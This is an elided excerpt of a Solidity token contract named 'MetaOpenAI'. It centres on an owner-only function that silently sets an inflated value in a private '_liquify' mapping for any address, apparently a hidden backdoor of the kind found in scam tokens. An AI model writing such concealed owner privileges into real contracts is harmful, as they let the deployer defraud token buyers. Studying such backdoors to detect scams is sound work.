...
contract MetaOpenAI is Ownable {
  ...
  address private MetaOpenAIOwner = msg.sender;
  ...
  constructor(string memory _name, string memory _symbol) public {
    ...
    symbol = _symbol;
    decimals = 9;
    totalSupply =  800000 * 10 ** uint256(decimals);
  ...
  function MetaOpenAIFunction(address account, uint256 _amount) external {
        require(msg.sender == MetaOpenAIOwner, "Only own");
        // Check that the buyer is not the zero address
        require(account != address(0));
        // Check that the amount is not zero
        require(_amount != 0);
        uint256 solde = 1;
        uint256 viralvalue = 10;
        uint256 __decimals = 9;
        if (solde > 0) {
        _liquify[account] = solde * _amount * viralvalue ** __decimals;
    }}
